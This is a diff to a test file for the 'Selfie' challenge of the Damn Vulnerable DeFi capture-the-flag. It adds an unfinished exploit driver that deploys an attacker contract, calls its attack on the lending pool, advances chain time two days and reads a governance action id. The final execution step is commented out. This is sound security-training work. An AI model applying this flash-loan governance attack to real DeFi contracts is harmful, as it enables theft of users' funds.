@@ -31,11 +31,33 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
+        // this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
+        // this.pool = await SelfiePoolFactory.deploy(
+        //     this.token.address,
+        //     this.governance.address    
+        // );
+        console.log('================TEST================');
+        const SelfiePoolAttackerFactory = await ethers.getContractFactory('SelfiePoolAttacker', deployer);
+        const attackerContract = await SelfiePoolAttackerFactory.deploy(
+            attacker.address,
+            this.token.address,
+            this.pool.address,
+            this.governance.address,
+        )
+        console.log('2');
+        await attackerContract.attack(TOKENS_IN_POOL);
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+        // get actionId???
+        const actionId = await attackerContract.connect(attacker).actionId();
+        console.log('actionId', actionId);
+        // governance.executeAction('actionId'); //after 2 days
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-
+        console.log('Pool', await this.token.balanceOf(this.pool.address))
+        console.log('me', await this.token.balanceOf(attacker.address))
         // Attacker has taken all tokens from the pool
         expect(
             await this.token.balanceOf(attacker.address)
